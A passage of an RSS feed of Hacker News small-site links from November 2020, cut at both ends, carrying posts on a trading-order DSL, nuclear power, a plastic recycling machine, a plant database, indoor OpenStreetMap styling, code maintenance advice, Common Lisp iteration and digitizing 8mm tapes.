					Tradingsymbol: <span>"INFY"</span>,
					Price:         <span>20.34</span>,
					OrderType:     <span>"LIMIT"</span>,
				},
			},
		}: e.Result{
			Result:  <span>true</span>,
			Message: <span>"Your order price is higher than the …</span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://zerodha.tech/blog/a-lesson-in-niche-business-dsls-at-scale/">https://zerodha.tech/blog/a-lesson-in-niche-business-dsls-at-scale/</a></em></p>]]>
            </description>
            <link>https://zerodha.tech/blog/a-lesson-in-niche-business-dsls-at-scale/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25198991</guid>
            <pubDate>Tue, 24 Nov 2020 14:58:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[John Kerry Shifts Position on Nuclear Power to Face the Challenge of Climate]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25198858">thread link</a>) | @ericdanielski
<br/>
November 24, 2020 | https://rationalmiddle.com/secretary-john-kerry-shifts-position-on-nuclear-power-to-face-the-challenge-of-climate-change/ | <a href="https://web.archive.org/web/*/https://rationalmiddle.com/secretary-john-kerry-shifts-position-on-nuclear-power-to-face-the-challenge-of-climate-change/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="body">
        <div>
            <div>
  				<div id="content" role="main">
                	<article>	

           
    <div>
        <p>The debate over nuclear power is a hotly contested one. Opponents cite old and still important challenges like safety of citizens from atomic radiation, security of nuclear material, and the remaining waste product produced by nuclear power. Some of these issues had almost been forgotten by the public until the explosion of <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;cad=rja&amp;uact=8&amp;ved=0ahUKEwj-m_7-hLvRAhUC4oMKHcr8DXUQFggcMAA&amp;url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FFukushima_Daiichi_Nuclear_Power_Plant&amp;usg=AFQjCNFjDkYep94vHSleUg_0nEpPa9--GA&amp;sig2=ImRId1sZbKSDMYro6Qi9fA">Fukushima Daiichi</a>, a Generation II nuclear plant in Japan, in 2011. Nuclear disaster is a fear deeply embedded in our psyche. It’s the subject of countless movie plots and TV shows.</p>
<p>However, in the last decade a new fervor for nuclear has been building around nuclear both for and against. This interest has inspired the creation <a href="http://pandoraspromise.com/">documentary</a> <a href="http://www.imdb.com/title/tt1194612/combined">films</a> and sparked the formation of <a href="https://en.wikipedia.org/wiki/Transatomic_Power">new companies</a> which aim to tackle the things that make the public uneasy about nuclear. Proponents have been touting new safety systems and a return to research performed in the 60s and 70s on reactors that would produce far less waste than current designs.</p>
<p>Increasingly, both sides have been playing tug of war over this information, but little has been said directly by the Obama administration. Obama did appoint Ernest Moniz, a nuclear physicist, to the post of Energy Secretary in 2013, but both Moniz and the administration have been relatively quiet about nuclear since that time – until this week.</p>
<p>During a <a href="https://www.state.gov/secretary/remarks/2017/01/266741.htm">speech at MIT</a> on January 9, 2017, Secretary of State John Kerry explained that he once did not believe nuclear was a viable solution and supported Bill Clinton in shutting down nuclear research. He went on to say that, given the challenge of climate change and the advances in nuclear proposed in Generation IV, that researchers should “go for it”.</p>
<p>This kind of ability to reassess one’s position with scientific advancements, learning new information, and placing it in the context of the challenge of climate change and the food/water/energy nexus is what the Rational Middle is all about.</p>
<p>Watch the video below.</p>
<p><iframe width="900" height="506" src="https://www.youtube.com/embed/f15rSTy7Spg?feature=oembed" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen=""></iframe></p>
                
                
        
            </div><!--/item-content-->
    </article>                </div><!--#content-->
                            </div><!--/row-->
        </div><!--/container-->
    </div></div>]]>
            </description>
            <link>https://rationalmiddle.com/secretary-john-kerry-shifts-position-on-nuclear-power-to-face-the-challenge-of-climate-change/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25198858</guid>
            <pubDate>Tue, 24 Nov 2020 14:47:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Homemade recycling rig turns plastic waste into new products]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25198780">thread link</a>) | @lysp
<br/>
November 24, 2020 | https://blog.arduino.cc/2020/11/24/homemade-recycling-rig-turns-plastic-waste-into-new-products/ | <a href="https://web.archive.org/web/*/https://blog.arduino.cc/2020/11/24/homemade-recycling-rig-turns-plastic-waste-into-new-products/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-26604">
<h3>Homemade recycling rig turns plastic waste into new products</h3>
<p> — <span>November 24th, 2020</span>
</p>
<div>
<figure><p><img src="https://blog.arduino.cc/wp-content/uploads/2020/11/F3ZCZAFKHJ4PNG6.jpg" alt="" srcset="https://blog.arduino.cc/wp-content/uploads/2020/11/F3ZCZAFKHJ4PNG6.jpg 1024w, https://blog.arduino.cc/wp-content/uploads/2020/11/F3ZCZAFKHJ4PNG6-300x225.jpg 300w, https://blog.arduino.cc/wp-content/uploads/2020/11/F3ZCZAFKHJ4PNG6-385x289.jpg 385w, https://blog.arduino.cc/wp-content/uploads/2020/11/F3ZCZAFKHJ4PNG6-768x576.jpg 768w" sizes="(max-width: 1024px) 100vw, 1024px"></p></figure>
<p>While that plastic cup, bag, dish, or other item may have served its purpose, more than likely it could be formed into something new. With this in mind, the SOTOP-Recycling team of Manuel Maeder, Benjamin Krause, and Nadina Maeder developed <a href="https://www.instructables.com/Automated-Injection-Molding-Machine-for-Plastic-Re/">an automated injection molding machine</a> that can be built at home and is small enough to allow you to run your own recycling operation!</p>
<figure><p><img src="https://blog.arduino.cc/wp-content/uploads/2020/11/Plastic-Shredder.png" alt="" srcset="https://blog.arduino.cc/wp-content/uploads/2020/11/Plastic-Shredder.png 1024w, https://blog.arduino.cc/wp-content/uploads/2020/11/Plastic-Shredder-300x218.png 300w, https://blog.arduino.cc/wp-content/uploads/2020/11/Plastic-Shredder-768x558.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"></p></figure>
<p>The “Smart Injector” receives shredded pieces of plastic in a small hopper, then transports them down an extrusion pipe where heat is applied. This material is clamped together via a pair of stepper motors, with screws and timing belts implemented to apply sufficient pressure. Everything is controlled by an <a href="https://store.arduino.cc/mega-2560-r3">Arduino Mega</a>. </p>
<figure><p><img src="https://blog.arduino.cc/wp-content/uploads/2020/11/FEFM6F6KHKK52GD.jpg" alt="" srcset="https://blog.arduino.cc/wp-content/uploads/2020/11/FEFM6F6KHKK52GD.jpg 1024w, https://blog.arduino.cc/wp-content/uploads/2020/11/FEFM6F6KHKK52GD-300x200.jpg 300w, https://blog.arduino.cc/wp-content/uploads/2020/11/FEFM6F6KHKK52GD-768x512.jpg 768w" sizes="(max-width: 1024px) 100vw, 1024px"></p></figure>
<p>As shown in the video, the plastic waste is converted into phone covers in just minutes, though other things could also be made depending on the form tooling used.</p>
<figure><p>
<iframe title="Injection molding machine for recycling plastic" width="500" height="281" src="https://www.youtube.com/embed/Eq9IbetsLB4?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>
<section>


<p>
<small>

You can follow any responses to this entry through the <a href="https://blog.arduino.cc/2020/11/24/homemade-recycling-rig-turns-plastic-waste-into-new-products/feed/">RSS 2.0</a> feed.
You can <a href="#respond">leave a response</a>, or <a href="https://blog.arduino.cc/2020/11/24/homemade-recycling-rig-turns-plastic-waste-into-new-products/trackback/" rel="trackback">trackback</a> from your own site.
</small>
</p>
</section>
</div>
</div></div>]]>
            </description>
            <link>https://blog.arduino.cc/2020/11/24/homemade-recycling-rig-turns-plastic-waste-into-new-products/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25198780</guid>
            <pubDate>Tue, 24 Nov 2020 14:39:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Making 8500 plants available to you]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25198771">thread link</a>) | @roboben
<br/>
November 24, 2020 | https://permapeople.org/blog/2020/11/23/making-8500-plants-available.html | <a href="https://web.archive.org/web/*/https://permapeople.org/blog/2020/11/23/making-8500-plants-available.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><img src="https://permapeople.org/blog/assets/making-8500-plants-available-on-permapeople.jpg" alt="8500 plants available on Permapeople"></p>

<p><strong>tl;dr We made ~8500 plants available to you by importing the Plant For a Future dataset. You can use it now to create lists, guilds and help improving that data.</strong></p>

<p>The first thing I did when I started Permapeople was to look at other plant databases and platforms with a similar focus. If you ever were in the situation to try to get some information about specific plants, especially attributes which are important for a Permaculture style of gardening, there is a high chance you found <a href="https://pfaf.org/">Plants for a Future</a> (PFAF). It is a database started by Addy and Ken Fern, later turned into a not for profit organization operated by a handful of trustees. In recent years, they refocused their work on plants’ role in fighting climate change through carbon sequestration. If you don’t know them, you should definitely check them out.</p>

<p>I put a lot of consideration into importing the PFAF database into Permapeople, but decided against it in the beginning. The more I talked to people and our first users, I figured that using existing datasets saves contributors a lot of time and provides an immediate value. Most people I talked to are beginners or people running larger gardening operations, and I wanted to create something that could help them immediately in their projects. I think the PFAF database is one of the best resources available, but I found some problems with it, limiting its usefulness.</p>

<h2 id="data-quality">Data Quality</h2>

<p>While the PFAF dataset is probably the biggest by numbers and completeness, it has a few problems: Many things are outdated, incorrect, ambiguous, or incoherent. Some might think that plant data and its field, <em><a href="https://en.wikipedia.org/wiki/Botany">botany</a></em> is a static field. Actually, it is really the opposite: New discoveries, nomenclature changes, and fresh scientific research comes in weekly. Keeping track of this with a tiny circle of paid workers is a tough job to do. Even if you could contribute a fix, there is no way of doing that. Crowdsourcing this problem by letting anyone change the data could be very helpful. This is one of the main reasons I started Permapeople: I wanted to have one place to find up-to-date, correct, peer-reviewed information on the plants I want to grow. If I miss some info or find something incorrect, I can easily edit it and help everyone who needs this information after me. Think Wikipedia, but specifically for plants.</p>

<h2 id="no-clear-roadmap">No clear roadmap</h2>

<p>What makes working with PFAF data more challenging is that there is no information on if and when data gets corrected, updated, or added to PFAF. We do not know if and when new features will be added and if the organization will shift its focus to other projects in the future.</p>

<h2 id="unstructured-data">Unstructured Data</h2>

<p>While this is related to the data quality, the PFAF data is not structured and rather a full-text description of the plant. This makes it hard to find or sort through specific info because many attributes are not filterable and searchable. For example, while PFAF has great information on <em>companion planting</em>, it’s impossible to search based on these connections. You are left with searching through many plant profiles, reading long paragraphs, and scanning for the required information.</p>

<h2 id="missing-features">Missing features</h2>

<p>Having a database is great, but information seekers and contributors need some functionality to work with it. PFAF doesn’t provide any of that, and this is why we already added some of these missing features to Permapeople.</p>

<h3 id="see-the-editing-history-and-sources">See the editing history and sources</h3>

<p>A huge factor of why Wikipedia is so trustworthy is that every change is public and can be easily reviewed by anyone. This lets a user easily gauge any meta-information about a plant: Is this info credible or just a myth created by the hive-mind of the internet? Do many people agree with that info? Are there sources proving the correctness of the information? If yes, how many? Or how are people working within a similar climate to you faring with that plant?</p>

<h3 id="create-plant-connections-and-guilds">Create plant connections and guilds</h3>

<p>Companion planting and the more advanced <a href="http://www.neverendingfood.org/b-what-is-permaculture/permaculture-guilds/">concept of guilds</a> are a huge part of the success of Permaculture. At Permapeople, you can create explicit plant connections (may they be beneficial or adversary) and organize plants into guilds. This info can be fed back to the database and give users even better information: If two plants are used in many user-generated guilds, there is a high chance that these plants go well together.</p>

<p>Much of this functionality is in a very early stage, and we need your help and feedback to improve these features and the data itself. I hope this post helped you understand why I imported the PFAF dataset into Permapeople and how we plan to improve on the hard work PFAF and its contributors have already accomplished. In the best case, we can contribute our changes back to PFAF.</p>

<p>If you are interested, I suggest you try to <a href="https://permapeople.org/search">search for some plants</a> and <a href="https://permapeople.org/users/sign_up">sign up</a> to create your first list or guild.</p>

<p>Happy growing 🌱✌️,</p>

<p>Ben</p>

<p>PS: If you work for PFAF (or know someone who does), please reach out to us at hello at permapeople org - we’d love to talk about the future!</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://permapeople.org/blog/2020/11/23/making-8500-plants-available.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25198771</guid>
            <pubDate>Tue, 24 Nov 2020 14:38:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A heat map and a new styling for Indoor= (Openstreetmap indoor mapping)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25198621">thread link</a>) | @liotier
<br/>
November 24, 2020 | https://2metz.fr/blog/indoorequal-style-heatmap/ | <a href="https://web.archive.org/web/*/https://2metz.fr/blog/indoorequal-style-heatmap/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <article lang="en">
  
  <p><time datetime="2020-11-24 00:00:00 +0000">24 November 2020</time> - François</p>

  <p><em>For those who are not familiar with <a href="https://indoorequal.org/">indoor=</a>, I recommend consulting the <a href="https://2metz.fr/blog/indoorequal-openstreetmap-indoor-viewer/">introductory post</a>. In short, it’s a map that displays the interior spaces of OpenStreetmap with a level selector.</em></p>

<p>A new version is available with improvements such as the heat map and a new styling.</p>

<h2 id="heat-map">Heat map</h2>

<p>To rapidly visualize locations that are indoor mapped, <a href="https://indoorequal.org/">indoor=</a> can now display a low zoom heat map.</p>

<figure>
<img alt="A heat map to locate indoor mapped locations in OpenStreetMap" src="https://2metz.fr/assets/blog/indoorequal-heatmap-2adfe009e4cc18dda707f9c67f30822aaa9214b5c70c5bfcf4138a891d099a2e.png" integrity="sha256-Kt/gCeTMGN2nB/nGfzCCKqqSFLXHDFv89BOKiR0Jmi4=" crossorigin="anonymous">
<figcaption>A heat map to locate indoor mapped locations in OpenStreetMap</figcaption>
</figure>

<p>It will therefore be much easier to locate indoor mapped locations. Here are a few places that I discovered:</p>

<ul>
  <li><a href="https://indoorequal.org/#map=17.29/41.97637/-87.905125&amp;level=1">Chicago Airport, IL, USA</a></li>
  <li><a href="https://indoorequal.org/#map=17/1.360945/103.990497&amp;level=1">Singapore Airport, Singapor</a></li>
  <li><a href="https://indoorequal.org/#map=17.39/51.499368/-0.12456&amp;level=1">House of Commons, London, UK</a></li>
  <li><a href="https://indoorequal.org/#map=18.77/38.8977124/-77.0365066">The White House, Washington D.C., USA</a></li>
</ul>

<p>This work was carried out by <a href="https://pavie.info/">Adrien Pavie</a>.</p>

<h2 id="new-styling">New styling</h2>

<p>In order to clearly distinguish the different interior spaces, the styling has been largely revised.</p>

<ul>
  <li>Rooms with interest points are in blue</li>
  <li>The other rooms are in yellow</li>
  <li>Traffic areas are in white</li>
  <li>A specific icon set to make the click more explicit has been added</li>
</ul>

<p><img alt="" src="https://2metz.fr/assets/blog/indoorequal-style-15cf917174f4ade9112135a4eba075741fa9f425d2773012ee4f2b99425bbc02.png" integrity="sha256-Fc+RcXT0rekRITWk66B1dB+p9CXSdzAS7k8rmUJbvAI=" crossorigin="anonymous"></p>

<p>In addition to the indispensable vending machines for drinks and other delicacies, you will also be able to see the ping-pong and foosball tables.</p>

<figure>
<img alt="" src="https://2metz.fr/assets/blog/indoorequal-table-tennis-ffbf484050c0f460f56fbc6b970e06ccff738699c48a81a081d003dcc66eee08.png" integrity="sha256-/79IQFDA9GD1b7xrlw4GzP9zhpnEioGggdAD3MZu7gg=" crossorigin="anonymous">
<figcaption><a href="https://indoorequal.org/#map=20.38/48.8520471/2.2868159&amp;level=1&amp;poi=node:2741751144">A ping-pong table at the École Centrale d'Électronique, Paris, France</a></figcaption>
</figure>

<figure>
<img alt="" src="https://2metz.fr/assets/blog/indoorequal-table-soccer-3b34b8ab0cda0ff16fc9d67d2656656f7bc4a8e053bf50a1988002ef4caa6d5e.png" integrity="sha256-OzS4qwzaD/FvydZ9JlZlb3vEqOBTv1ChmIAC70yqbV4=" crossorigin="anonymous">
<figcaption><a href="https://indoorequal.org/#map=20.03/48.9024495/2.4005376&amp;level=0">A foosball table in Arkose, Pantin, France</a></figcaption>
</figure>

<p>This work was carried out by <a href="https://www.jawg.io/">Jawg</a>.</p>

<h2 id="other-improvements">Other improvements</h2>

<ul>
  <li>Multiple interest points have been added</li>
  <li>The display of the interior doors has been corrected</li>
</ul>

<h2 id="integrate-indoor-in-your-map">Integrate indoor= in your map</h2>

<p>Do you want to add interior spaces to your map? Use the <a href="https://github.com/indoorequal/mapbox-gl-indoorequal">mapbox-gl-indoorequal</a> library and create your free API key on <a href="https://indoorequal.com/">indoorequal.com</a>.</p>

<p>If you are not using mapbox-gl, the schema has been updated so you can make your own integration: <a href="https://indoorequal.com/schema">indoorequal.com/schema</a>.</p>

<hr>

<p>Thanks to everyone who contributed to this version.</p>

<p>To have a look at all of this, you can go on <a href="https://indoorequal.org/">indoor=</a>.</p>

<p>And to learn more about mapping indoor spaces, please visit the <a href="https://wiki.openstreetmap.org/wiki/Simple_Indoor_Tagging">wiki page Simple Indoor Tagging</a>.</p>


</article>

    </div></div>]]>
            </description>
            <link>https://2metz.fr/blog/indoorequal-style-heatmap/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25198621</guid>
            <pubDate>Tue, 24 Nov 2020 14:19:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Always leave the code better than you found it]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25198597">thread link</a>) | @mooreds
<br/>
November 24, 2020 | https://letterstoanewdeveloper.com/2020/11/23/always-leave-the-code-better-than-you-found-it/ | <a href="https://web.archive.org/web/*/https://letterstoanewdeveloper.com/2020/11/23/always-leave-the-code-better-than-you-found-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Dear new developer,</p>



<p>I’ve spent a lot of my time maintaining working code. I think that is more typical of software developers than working in greenfield development. Yes, there are definitely jobs where you are writing more new code than maintaining, upgrading, bug fixing and improving old code (startups without product market fit being one, consulting being another) but in general code is expensive and folks want to run it for a long time. </p>



<p>Often you’ll jump into code to fix a bug, investigate an issue or answer a question.</p>



<p>When you do so, improve it. This doesn’t mean you rewrite it, or upgrade all the libraries it depends on, or rename all the variables. </p>



<p>You don’t need to transform it. </p>



<p>But you should make it better. Just clean it up a bit. Doing so makes everyone’s lives just a bit better, helps the codebase in a sustainable way, and assists the business by making its supporting infrastructure more flexible.</p>



<p>What are some ways to improve the code when you are in it?</p>



<p><strong>Document</strong></p>



<p>Whether that is a comment that explains something tricky, a larger piece of documentation external to the code which explains how to interact with it, or fixing a typo, trustworthy documentation is key to interacting with code. This is a good way to start improving a codebase because it has minimal impact on the actual code. Therefore it is low risk. But if you’ve ever had a great comment explain a confusing bit of code, you’ll appreciate the time this effort can save.</p>



<p>You can also help documentation by removing old, crufty docs. If you see a comment that doesn’t apply, remove it. If there’s cut and paste documentation which doesn’t apply, get rid of it. That cleans up the code for the next person to come along (who might be you).</p>



<p><strong>Write a test or improve a test</strong> </p>



<p>Tests help you write maintainable, extensible code that others can change fearlessly. If you run across code that isn’t tested and you have time and the supporting framework to write one, do so. </p>



<p>Even if it tests simple functionality such as “can I instantiate this object” or “how does this function react when I pass it two null values”, an additional test will help the robustness of the code. </p>



<p><strong>Refactor it</strong></p>



<p>This is one of the most flexible improvements. Refactoring code can range from renaming a variable to be more true to its nature to an overhaul of an entire module. Start small and don’t get wrapped up in perfection. Make the code clearer in intent. </p>



<p>It’s easy with refactoring to get wound around an axle and make too many changes and end up with broken things. Timeboxing is one technique I use to avoid, or at least minimize, my tendencies toward this when refactoring. If all I have is 30 minutes, I’ll make my changes smaller in scope.</p>



<p>A warning about refactoring. Don’t refactor what you don’t understand. Don’t drive by refactor. Discuss your plan with someone more familiar with the code; <code>git blame</code> is your friend. Especially if the code is not well tested, you want to make sure you don’t do more harm than good.</p>



<p><strong>Upgrade a dependency</strong></p>



<p>It’s sometimes a winding path, but upgrading your dependencies regularly is a good way to maintain the code. I remember working in a fork of struts. It was an important application for the company, but we didn’t spend the time upgrading the dependencies, because it was too painful. Eventually, parts of the code became harder to update. The entire application couldn’t benefit from newer technologies and paradigms because of the older dependencies holding it back. </p>



<p>It never feels good to spend time updating a dependency; to me this always feels like running in place. But if you don’t do so, eventually dependencies will end of life and you’ll be forced to update. That’ll be even less pleasant. </p>



<p>All of these actions not only help others because they improve the quality of the code, they also provide examples to other developers on how to do so. For example, it is far easier to write the second test in a suite than the first. You can cut and paste a lot of the setup code and tweak only what is different. The first bit of documentation will inspire more.</p>



<p>Code isn’t everything, but it is an important work output. Whenever you touch it, you should strive to leave it in a better place that it was before you did so.</p>



<p>Sincerely,</p>



<p>Dan</p>
	</div></div>]]>
            </description>
            <link>https://letterstoanewdeveloper.com/2020/11/23/always-leave-the-code-better-than-you-found-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25198597</guid>
            <pubDate>Tue, 24 Nov 2020 14:16:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Common Lisp Iteration]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25198573">thread link</a>) | @wooby
<br/>
November 24, 2020 | https://tailrecursion.com/~alan/Lisp/CommonLispIteration.html | <a href="https://web.archive.org/web/*/https://tailrecursion.com/~alan/Lisp/CommonLispIteration.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<p>
Created Monday 23 November 2020
</p>

<p>
Each of the following definitions of a <a href="https://en.wikipedia.org/wiki/Factorial" title="factorial">factorial</a> function demonstrate a way to <a href="https://en.wikipedia.org/wiki/Iteration#Computing" title="iterate">iterate</a> in <a href="https://en.wikipedia.org/wiki/Common_Lisp" title="Common Lisp">Common Lisp</a>, with brief notes. I hope that by demonstrating many different ways that the same thing can be written, you can develop a sense for the character of the constructs afforded by the language, and of the variety of possible styles. Common Lisp is famously syntactically extensible via <a href="https://en.wikipedia.org/wiki/Common_Lisp#Macros" title="macros">macros</a>, so keep in mind that my examples are by no means the <i>only</i> ways to iterate.
</p>

<p>
For further reading on the iteration and control structures of Common Lisp, I heartily recommend:
</p>

<ul>
<li><a href="http://www.gigamonkeys.com/book/macros-standard-control-constructs.html" title="Chapter 7">Chapter 7</a> and <a href="http://www.gigamonkeys.com/book/loop-for-black-belts.html" title="Chapter 22">Chapter 22</a> of <a href="https://amzn.to/3nOWKa2" title="Practical Common Lisp">Practical Common Lisp</a> by Peter Siebel.</li>
<li>A reasonably-priced used copy of <a href="https://amzn.to/2UUTfm3" title="ANSI Common Lisp">ANSI Common Lisp</a> by Paul Graham.</li>
</ul>


<p>
<i>Note: several of the examples return nonsensical results for negative inputs. The addition of <tt>(assert (not (minusp n)) </tt>or similar is a good idea, but I have omitted it here for clarity.</i>
</p>

<h2>DOTIMES</h2>

<pre>(defun factorial-dotimes (n &amp;aux (prod 1))
  (dotimes (i n prod)
    (setq prod (* prod (1+ i)))))
</pre>

<ul>
<li><a href="http://www.lispworks.com/documentation/HyperSpec/Body/03_dae.htm" title="&amp;aux lambda list keyword"><tt>&amp;aux</tt> lambda list keyword</a> names a local variable <tt>prod</tt>. <a href="http://www.lispworks.com/documentation/HyperSpec/Body/s_let_l.htm" title="LET"><tt>LET</tt></a> could also be used for this purpose, but at the cost of more indentation.</li>
<li><a href="http://www.lispworks.com/documentation/lw50/CLHS/Body/m_dotime.htm" title="DOTIMES"><tt>DOTIMES</tt></a> binds <tt>i</tt> successively from 0 to 1-n and finally evaluates to <tt>prod</tt>.</li>
</ul>


<h2>DO</h2>

<pre>(defun factorial-do (n)
  (do ((i 1 (1+ i))
       (prod 1 (* prod i)))
      ((&gt; i n) prod)))
</pre>

<ul>
<li><a href="http://www.lispworks.com/documentation/lw50/CLHS/Body/m_do_do.htm" title="DO"><tt>DO</tt></a> binds <tt>i</tt> to 1 and then to (1+ i) in subsequent iterations. <tt>prod</tt> is bound first to 1 and then to <tt>(* prod i)</tt> in subsequent iterations.</li>
<li>When the test clause <tt>(&gt; i n)</tt> becomes true, <tt>prod</tt> is returned. Contrast with the test clause of <tt>for</tt> loops in other languages, which terminate the loop when they become <i>false</i>.</li>
<li>I like the way Paul Graham explains <tt>DO </tt>and<tt> DO*</tt> in <a href="https://amzn.to/2UUTfm3" title="ANSI Common Lisp">ANSI Common Lisp</a>.</li>
</ul>


<h2>LOOP</h2>

<pre>(defun factorial-loop (n)
  (loop
     for i from 1 to n
     for prod = 1 then (* prod i)
     finally (return prod)))
</pre>

<ul>
<li><tt>i</tt> is bound from 1 to <tt>n</tt> inclusive.</li>
<li><tt>prod</tt> is bound to 1 and then <tt>(* prod i)</tt> in subsequent iterations in a manner similar to <tt>DO</tt>.</li>
<li>In the <tt>finally</tt> clause, <tt>prod</tt> is returned by <a href="http://www.lispworks.com/documentation/lw60/CLHS/Body/m_return.htm#return" title="RETURN"><tt>RETURN</tt></a> once iteration is complete. The <a href="http://www.lispworks.com/documentation/lw60/CLHS/Body/s_block.htm#block" title="BLOCK"><tt>BLOCK</tt></a> named NIL established by <tt>LOOP</tt> is the point of return.</li>
<li><a href="http://www.lispworks.com/documentation/lw50/CLHS/Body/m_loop.htm" title="LOOP"><tt>LOOP</tt></a> supports a comprehensive iteration and accumulation <a href="https://en.wikipedia.org/wiki/Domain-specific_language" title="DSL">DSL</a>. <a href="http://www.gigamonkeys.com/book/loop-for-black-belts.html" title="Chapter 22">Chapter 22</a> of <a href="https://amzn.to/3nOWKa2" title="Practical Common Lisp">Practical Common Lisp</a> offers a great introduction.</li>
</ul>


<h2>Recursion</h2>

<pre>(defun factorial-recursive (n)
  (if (zerop n)
      1
      (* n (factorial-recursive (1- n)))))
</pre>

<ul>
<li><tt>FACTORIAL-RECURSIVE</tt> calls itself, but when <tt>n</tt> exceeds the maximum stack size supported by the implementation, an error is signaled.</li>
</ul>


<pre>(defun factorial-tail-recursive (n)
  (labels ((recur (n prod)
             (if (zerop n)
                 prod
                 (recur (1- n) (* n prod)))))
    (recur n 1)))
</pre>

<ul>
<li><tt>FACTORIAL-TAIL-RECURSIVE </tt>does not call itself directly.</li>
<li>Instead, it defines with <a href="http://www.lispworks.com/documentation/HyperSpec/Body/s_flet_.htm" title="LABELS"><tt>LABELS</tt></a> an internal and recursive helper function, <tt>recur</tt>.</li>
<li>recur <a href="https://en.wikipedia.org/wiki/Tail_call" title="calls itself in tail position">calls itself in tail position</a> and the stack never overflows in implementations that implement tail-call elimination.</li>
</ul>


<h2>TAGBODY</h2>

<pre>(defun factorial-tagbody (n &amp;aux (i 0) (prod 1))
  (tagbody
     begin
     (when (eql i n)
       (return-from factorial-tagbody prod))
     (setq prod (* prod (incf i)))
     (go begin)))
</pre>

<ul>
<li><a href="http://www.lispworks.com/documentation/HyperSpec/Body/s_tagbod.htm" title="TAGBODY"><tt>TAGBODY</tt></a> is the most general but also the lowest-level and most verbose iteration construct.</li>
<li><a href="http://www.lispworks.com/documentation/HyperSpec/Body/03_dae.htm" title="&amp;aux lambda list keyword"><tt>&amp;aux</tt> lambda list keyword</a> names local variables <tt>i</tt> and <tt>prod</tt>, initializing them to 0 and 1, respectively.</li>
<li><tt>begin</tt> names a label within the <tt>TAGBODY</tt> that may be jumped to.</li>
<li><a href="http://www.lispworks.com/documentation/HyperSpec/Body/m_when_.htm" title="WHEN"><tt>WHEN</tt></a> <tt>i</tt> is <a href="http://www.lispworks.com/documentation/HyperSpec/Body/f_eql.htm" title="EQL"><tt>EQL</tt></a> to <tt>n</tt>, <a href="http://www.lispworks.com/documentation/lw60/CLHS/Body/s_ret_fr.htm" title="RETURN-FROM"><tt>RETURN-FROM</tt></a> returns <tt>prod</tt> from the <a href="http://www.lispworks.com/documentation/lw60/CLHS/Body/s_block.htm#block" title="BLOCK"><tt>BLOCK</tt></a> named after the function by <a href="http://www.lispworks.com/documentation/lw60/CLHS/Body/m_defun.htm" title="DEFUN"><tt>DEFUN</tt></a>.</li>
<li><a href="http://www.lispworks.com/documentation/HyperSpec/Body/s_go.htm" title="GO"><tt>GO</tt></a> jumps to <tt>begin</tt>.</li>
</ul>


</div></div>]]>
            </description>
            <link>https://tailrecursion.com/~alan/Lisp/CommonLispIteration.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25198573</guid>
            <pubDate>Tue, 24 Nov 2020 14:14:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Digitizing Old 8mm Tapes]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25198435">thread link</a>) | @todsacerdoti
<br/>
November 24, 2020 | https://blitter.net/blog/2020/11/24/digitizing-old-8mm-tapes/ | <a href="https://web.archive.org/web/*/https://blitter.net/blog/2020/11/24/digitizing-old-8mm-tapes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-660">
	<!-- .entry-header -->

	<div>
		
		<p>It’s astounding to think back and consider how much technological progress has occurred in just the past 15 years. Most folks today carry a smartphone in their pocket everywhere they go, and a great many of those smartphones have powerful cameras built in capable of recording multiple hours in high definition. Pair this ability with low-cost video editing software—<a href="https://www.blackmagicdesign.com/products/davinciresolve/" rel="noopener noreferrer" target="_blank">some of which comes at no cost at all</a>—and far more people today have the tools to practice shooting, editing, compositing, and rendering professional-looking videos on a modest budget.</p>
